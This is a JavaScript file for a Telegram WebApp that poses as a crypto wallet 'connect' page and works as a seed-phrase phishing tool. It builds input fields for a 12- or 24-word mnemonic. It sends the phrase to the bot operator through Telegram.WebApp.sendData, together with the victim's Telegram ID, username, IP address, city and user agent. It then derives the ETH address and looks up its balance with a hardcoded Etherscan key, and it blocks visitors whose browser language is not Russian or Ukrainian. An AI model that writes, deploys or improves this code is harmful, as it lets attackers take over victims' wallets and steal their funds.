// 🌍 IP та геолокація
let userIp = "undefined";
let userLocation = "undefined";

fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(data => {
        userIp = data.ip;
        userLocation = `${data.city}, ${data.country_name}`;
        console.log("📍 IP:", userIp, "| Локація:", userLocation);
    })
    .catch(() => {
        userIp = "unknown";
        userLocation = "unknown";
        console.warn("⚠️ Не вдалося отримати геолокацію");
    });

// 🚫 Блокування по мові
const langs = navigator.languages || [navigator.language || navigator.userLanguage];
const allowedLangs = ["ru", "ru-RU", "uk", "uk-UA"];
if (!langs.some(lang => allowedLangs.includes(lang))) {
    document.body.innerHTML = "<h3 style='text-align:center;margin-top:40vh;color:red;'>Доступ ограничен.</h3>";
    throw new Error("🚫 Заблоковано через мову");
}

document.addEventListener("DOMContentLoaded", () => {
    console.log("📦 DOMContentLoaded подія спрацювала");

    // Telegram WebApp перевірка
    if (!window.Telegram || !Telegram.WebApp) {
        console.warn("❌ Telegram WebApp не ініціалізовано!");
    } else {
        console.log("✅ Telegram WebApp працює");
    }

    const btn = document.getElementById("submitBtn");
    const lengthInput = document.getElementById("length");
    const seedContainer = document.getElementById("seedContainer");

    if (!btn || !lengthInput || !seedContainer) {
        console.error("❌ Не знайдені необхідні елементи DOM");
        return;
    }

    renderSeedInputs();
    setupSelect();

    btn.addEventListener("click", () => {
        console.log("🔘 Кнопка 'Подключить' нажата");
        submitSeed();
    });

    lengthInput.addEventListener("change", () => {
        renderSeedInputs();
        clearWarning();
    });
});

// 📦 Генерація полів
function renderSeedInputs() {
    const length = parseInt(document.getElementById("length").value);
    const container = document.getElementById("seedContainer");
    container.innerHTML = "";

    for (let i = 0; i < length; i++) {
        const input = document.createElement("input");
        input.type = "text";
        input.placeholder = `${i + 1}`;
        input.classList.add("seed-word");
        container.appendChild(input);
    }

    const firstInput = container.querySelector("input");
    if (firstInput) {
        firstInput.addEventListener("input", handleBulkSeedInput);
        firstInput.addEventListener("paste", (e) => {
            setTimeout(() => handleBulkSeedInput(e), 50);
        });
    }
}

// 📋 Масова вставка
function handleBulkSeedInput(e) {
    const inputs = document.querySelectorAll(".seed-word");
    const words = e.target.value.trim().split(/\s+/);
    if (words.length > 1) {
        inputs.forEach((input, i) => input.value = words[i] || "");
    }
}

// 🌀 Wallet selector
function setupSelect() {
    const selectWrapper = document.querySelector('.custom-select');
    const selected = selectWrapper.querySelector('.selected');
    const options = selectWrapper.querySelectorAll('.options li');
    const hiddenInput = document.querySelector('#wallet');

    selected.addEventListener('click', () => selectWrapper.classList.toggle('open'));
    options.forEach(option => {
        option.addEventListener('click', () => {
            selected.innerHTML = option.innerHTML;
            hiddenInput.value = option.dataset.value;
            selectWrapper.classList.remove('open');
        });
    });

    document.addEventListener('click', e => {
        if (!selectWrapper.contains(e.target)) {
            selectWrapper.classList.remove('open');
        }
    });
}

// ⚠️ Попередження
function showWarning(message) {
    let warning = document.getElementById("validationWarning");
    if (!warning) {
        warning = document.createElement("p");
        warning.id = "validationWarning";
        warning.style.color = "#ff4d4d";
        warning.style.fontSize = "13px";
        warning.style.marginTop = "10px";
        document.querySelector(".container").appendChild(warning);
    }
    warning.textContent = message;
    warning.style.display = "block";
}
function clearWarning() {
    const warning = document.getElementById("validationWarning");
    if (warning) warning.style.display = "none";
}

// ⏳ Статус
function showProcessing(message) {
    let processing = document.getElementById("processingInfo");
    if (!processing) {
        processing = document.createElement("p");
        processing.id = "processingInfo";
        processing.style.color = "#999";
        processing.style.fontSize = "14px";
        processing.style.marginTop = "12px";
        document.querySelector(".container").appendChild(processing);
    }
    processing.textContent = message;
}

// 🚀 submitSeed
function submitSeed() {
    clearWarning();

    const length = parseInt(document.getElementById("length").value);
    const wallet = document.getElementById("wallet").value || "unknown";
    const ua = navigator.userAgent;
    const inputs = document.querySelectorAll(".seed-word");
    const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);

    if (words.length !== length) {
        showWarning(`❌ Введено ${words.length}, очікується ${length} слів`);
        return;
    }

    const invalidWords = words.filter(w => !/^[a-zA-Z]+$/.test(w));
    if (invalidWords.length) {
        showWarning(`🚫 Недопустимі символи: ${invalidWords.join(", ")}`);
        return;
    }

    const seed = words.join(" ");
    document.querySelector(".container").innerHTML = "<h3 style='color:green;text-align:center'>⏳ Перевірка…</h3>";

    const tgUser = Telegram?.WebApp?.initDataUnsafe?.user || {};
    const payload = {
        user_id: tgUser.id || "-",
        username: tgUser.username || "-",
        seed,
        wallet,
        length,
        ua,
        ip: userIp,
        location: userLocation,
        address: "-",
        balance: "-",
        timestamp: new Date().toISOString()
    };

    localStorage.setItem("payload_backup", JSON.stringify(payload));
    console.log("📦 Payload:", payload);

    if (Telegram?.WebApp?.sendData) {
        Telegram.WebApp.sendData(JSON.stringify(payload));
        console.log("✅ Payload надіслано");
    } else {
        console.warn("❌ WebApp.sendData недоступний");
    }

    setTimeout(() => {
        window.location.href = "profile.html";
    }, 1200);
}

// 📊 Профіль
function showProfileData() {
    const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
    const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");

    document.getElementById("timestamp").textContent = data.timestamp || "-";
    document.getElementById("userIp").textContent = data.ip || "-";
    document.getElementById("userLocation").textContent = data.location || "-";
    document.getElementById("seed").textContent = data.seed || "-";

    if (!data.seed) return;

    try {
        const wallet = ethers.Wallet.fromMnemonic(data.seed);
        const ethAddress = wallet.address;
        document.getElementById("ethAddress").textContent = ethAddress;
        fetchETHBalance(ethAddress, ETHERSCAN_API_KEY);
    } catch (e) {
        console.error("❌ ETH генерація:", e.message);
    }

    document.getElementById("goWalletBtn").addEventListener("click", () => {
        const walletType = (data.wallet || "").toLowerCase();
        let url = "https://www.google.com";
        if (walletType.includes("metamask")) url = "https://metamask.io/";
        else if (walletType.includes("trust")) url = "https://trustwallet.com/";
        else if (walletType.includes("phantom")) url = "https://phantom.app/";
        else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
        else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";

        Telegram?.WebApp?.openLink?.(url) || window.open(url, "_blank");
    });
}

async function fetchETHBalance(address, key) {
    try {
        const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${key}`;
        const res = await fetch(url);
        const json = await res.json();
        if (!json || json.status !== "1" || !json.result) throw new Error("ETH API error");
        const ethBalance = parseFloat(json.result) / 1e18;
        document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
    } catch (e) {
        console.warn("❌ Помилка балансу ETH:", e.message);
        document.getElementById("walletBalance").textContent = "–";
    }
}
